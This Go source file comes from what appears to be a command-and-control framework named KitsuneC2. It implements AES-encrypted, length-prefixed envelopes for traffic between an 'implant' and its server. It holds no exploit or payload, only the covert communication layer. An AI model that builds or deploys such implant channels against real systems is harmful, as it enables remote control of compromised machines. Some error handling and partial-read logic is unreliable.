//Package containing functionality for communication between an implant and the server. This file contains helper functions used by both
//the server and the implant to fascillitate networking functionality

package communication

import (
	"KitsuneC2/lib/cryptography"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"net"
	"reflect"
)

// All communication between the client and servers get wrapped in an envelope. This envelope contains the type of the message being sent, and
// the message data itself. The Data variable can be further deserialized into specific message types.
type envelope struct {
	MessageType int
	Data        []byte
}

// This function is used by the server to communicate with an implant. Given a messageType and its contents, it wraps the data in an envelope
// datastructure and encrypts the content. It prepends the encrypted content with the length of the content so that the implant knows how many
// bytes to read from the connection.
func SendEnvelopeToImplant(connection net.Conn, messageType int, data interface{}, aesKey []byte) error {
	encryptedJson, err := packAndEncryptEnvelope(messageType, data, aesKey)
	if err != nil {
		return err
	}
	//create a buffer and write the len(encryptedData) + encryptedData into it
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedJson)))
	buffer.Write(encryptedJson)

	err = writeToSocket(connection, buffer.Bytes())
	if err != nil {
		return err
	}

	return nil
}

// Works almost exactly the same as the function "SendevelopeToImplant", the only difference being that this function includes the "implantId"
// parameter. This parameter needs to be of md5 format(length==32). This parameter is used by the server to identify which implant is trying to
// communicate with it.
func SendEnvelopeToServer(connection net.Conn, implantId string, messageType int, data interface{}, aesKey []byte) error {
	if len(implantId) != 32 {
		return errors.New("implantId is not 32 bytes")
	}

	encryptedJson, err := packAndEncryptEnvelope(messageType, data, aesKey)
	if err != nil {
		return err
	}

	//create a buffer and write the len(encryptedData + implantId) + encryptedData into it
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(encryptedJson)+len(implantId)))
	buffer.Write([]byte(implantId))
	buffer.Write(encryptedJson)

	err = writeToSocket(connection, buffer.Bytes())
	if err != nil {
		return err
	}

	return nil
}

// Reads the first 4 bytes (uint32) from socket (message length). The reads the entire encrypted message. Afterwards, the function decrypts the message
// and attempts to unmarshal the resulting JSON into a Envelope object.
func ReceiveEnvelopeFromServer(connection net.Conn, aesKey []byte) (int, interface{}, error) {
	messageLengthAsBytes, err := readFromSocket(connection, 4)
	if err != nil {
		return -1, nil, err
	}
	messageLength := binary.LittleEndian.Uint32(messageLengthAsBytes)

	cipherText, err := readFromSocket(connection, int(messageLength))
	if err != nil {
		return -1, nil, err
	}
	rawJsonAsBytes, err := cryptography.DecryptAes(cipherText, []byte(aesKey))
	if err != nil {
		return -1, nil, err
	}

	var messageEnvelope *envelope = new(envelope)
	json.Unmarshal(rawJsonAsBytes, messageEnvelope)

	dataAsStruct := MessageTypeToStruct[messageEnvelope.MessageType]()
	err = json.Unmarshal(messageEnvelope.Data, dataAsStruct)
	if err != nil {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	//use reflection to check that MessageType and data correspond correctly.
	expectedType := reflect.TypeOf(MessageTypeToStruct[messageEnvelope.MessageType]())
	dataType := reflect.TypeOf(dataAsStruct)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return -1, nil, errors.New("data does not correspond to messageType")
	}

	return messageEnvelope.MessageType, dataAsStruct, nil
}

func ReceiveEnvelopeFromImplant(connection net.Conn, aesKey []byte) (string, int, interface{}, error) {
	messageLengthAsBytes, err := readFromSocket(connection, 4)
	if err != nil {
		return "", -1, nil, err
	}
	messageLength := binary.LittleEndian.Uint32(messageLengthAsBytes)

	messageContent, err := readFromSocket(connection, int(messageLength))
	if err != nil {
		return "", -1, nil, err
	}

	implantId := string(messageContent[:32]) //the first 32 bytes of the message is the implantId.
	cipherText := messageContent[32:]        //the rest is ciphertext

	rawJsonAsBytes, err := cryptography.DecryptAes(cipherText, []byte(aesKey))
	if err != nil {
		return "", -1, nil, err
	}

	var messageEnvelope *envelope = new(envelope)
	json.Unmarshal(rawJsonAsBytes, messageEnvelope)

	dataAsStruct := MessageTypeToStruct[messageEnvelope.MessageType]()
	err = json.Unmarshal(messageEnvelope.Data, dataAsStruct)
	if err != nil {
		return "", -1, nil, errors.New("data does not correspond to messageType")
	}

	//use reflection to check that MessageType and data correspond correctly.
	expectedType := reflect.TypeOf(MessageTypeToStruct[messageEnvelope.MessageType]())
	dataType := reflect.TypeOf(dataAsStruct)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return "", -1, nil, errors.New("data does not correspond to messageType")
	}

	return implantId, messageEnvelope.MessageType, dataAsStruct, nil
}

// Given the type of message and it's arguments, wraps the data in an envelope datastructure and encrypts the whole datastructure. The function
// returns the encrypted representation of an envelope object in bytes.
func packAndEncryptEnvelope(messageType int, data interface{}, aesKey []byte) ([]byte, error) {
	//First we check if the data variable corresponds to the correct messageType using reflection.
	expectedType := reflect.TypeOf(MessageTypeToStruct[messageType]())
	dataType := reflect.TypeOf(data)
	if !dataType.AssignableTo(expectedType) && !reflect.PointerTo(dataType).AssignableTo(expectedType) {
		return nil, errors.New("data does not correspond to messageType")
	}

	//After we know all types are correct, marshal the passed data and put it in an envelope. Afterwards marshal the whole envelope so that
	//it can be encrypted.
	envelopeData, _ := json.Marshal(data)
	rawJson, _ := json.Marshal(envelope{MessageType: messageType, Data: envelopeData})

	encryptedJson, err := cryptography.EncryptAes(rawJson, []byte(aesKey))
	if err != nil {
		return nil, err
	}
	return encryptedJson, nil
}

// Writes data to a socket. The function checks if the number of bytes actually written to the socket == len(data).
func writeToSocket(connection net.Conn, data []byte) error {
	bytesWritten, err := connection.Write(data)
	if err != nil {
		return err
	}
	if bytesWritten != len(data) {
		return errors.New("data was only partially sent to server")
	}
	return nil
}

// Reads n bytes from a socket.
func readFromSocket(connection net.Conn, n int) ([]byte, error) {
	var buffer []byte = make([]byte, n)
	bytesRead, err := connection.Read(buffer) //connection.Read reads a maximum of len(buffer)
	if err != nil {
		return nil, err
	}
	if bytesRead != n {
		return nil, errors.New("data was only partially received from server")
	}
	return buffer, nil
}
